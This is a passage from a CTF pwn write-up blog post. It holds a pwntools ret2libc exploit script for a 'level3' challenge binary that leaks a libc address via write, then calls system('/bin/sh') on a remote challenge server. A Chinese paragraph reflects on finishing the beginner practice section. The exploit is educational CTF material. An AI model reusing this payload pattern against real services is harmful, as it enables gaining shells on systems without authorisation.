class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8                                            &#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;                                                                                                                   </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">from pwn import *                                                                                                                                                             </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;level3&quot;)                                                                                                                                                      </span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,31892)                                                                                                                                             </span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;level3&quot;)                                                                                                                                                         </span><br><span class=\"line\">libc &#x3D; ELF(&quot;libc_32.so.6&quot;)                                                                                                                                                    </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">write_plt &#x3D; elf.plt[&quot;write&quot;]                                                                                                                                                  </span><br><span class=\"line\">write_got &#x3D; elf.got[&quot;write&quot;]                                                                                                                                                  </span><br><span class=\"line\">write_offset &#x3D; libc.symbols[&quot;write&quot;]                                                                                                                                          </span><br><span class=\"line\">system_offset &#x3D; libc.symbols[&quot;system&quot;]                                                                                                                                        </span><br><span class=\"line\">bin_sh_offset &#x3D; libc.search(&quot;&#x2F;bin&#x2F;sh&quot;).next()                                                                                                                                 </span><br><span class=\"line\">vul_addr &#x3D; 0x0804844B                                                                                                                                                         </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">payload &#x3D; 140*&#39;a&#39;                                                                                                                                                             </span><br><span class=\"line\">payload +&#x3D; p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(4)                                                                                                  </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">start_content &#x3D; p.recvuntil(&quot;Input:\\n&quot;)                                                                                                                                       </span><br><span class=\"line\">print start_content                                                                                                                                                           </span><br><span class=\"line\">p.sendline(payload)                                                                                                                                                           </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">output &#x3D; p.recvuntil(&quot;Input:\\n&quot;)                                                                                                                                              </span><br><span class=\"line\">print output                                                                                                                                                                  </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">write_addr &#x3D; u32(output[:4])                                                                                                                                                  </span><br><span class=\"line\">print &quot;[*] write_addr:&quot;,hex(write_addr)                                                                                                                                       </span><br><span class=\"line\">                                                                                                                                                                              </span><br><span class=\"line\">system_addr &#x3D; write_addr - write_offset + system_offset                                                                                                                       </span><br><span class=\"line\">bin_sh_addr &#x3D; write_addr - write_offset + bin_sh_offset</span><br><span class=\"line\"></span><br><span class=\"line\">print &quot;[*] system_addr:&quot;,hex(system_addr)</span><br><span class=\"line\">print &quot;[*] bin_sh_addr:&quot;,hex(bin_sh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; 140*&#39;a&#39;</span><br><span class=\"line\">payload +&#x3D; p32(system_addr) + p32(vul_addr) + p32(bin_sh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"结语\"><a class=\"markdownIt-Anchor\" href=\"#结语\"></a> 结语</h2>\n<p>  其实新手区已经刷完一段时间了，感觉难度还好吧，基本没有很难得题目，但是非常适合新手入门做。还是学会了一些东西，比方说看到某函数就大概反应可能会怎么利用，练习了动态调试之类的。没有白付出时间吧。遗憾是还没做到堆入门的题目，期待接下来的高手区练习（已经做了几道题了，还是没碰到堆的）。</p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":4,"path":"api/tags/pwn.json"}]}